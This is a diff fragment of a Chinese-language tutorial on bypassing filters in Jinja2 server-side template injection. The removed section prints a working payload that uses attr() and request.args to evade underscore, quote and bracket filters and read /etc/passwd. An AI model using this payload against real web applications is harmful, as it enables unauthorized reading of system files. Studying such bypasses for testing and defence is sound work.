@@ -214,14 +214,7 @@ values 同理 数据为post
 ```
 ![Yo0pqI.png](https://s1.ax1x.com/2020/05/20/Yo0pqI.png)
 
-## ⑦ 下划线、引号、中括号 被过滤
 
-利用上述方法进行组合，构造如下payload
-
-```python
-?name={ { ((()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)())|attr(request.args.geti)(40)(request.args.file)).read()} }&class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&file=/etc/passwd
-```
-![YIwr6A.png](https://s1.ax1x.com/2020/05/19/YIwr6A.png)
 
 
 # 三、参考
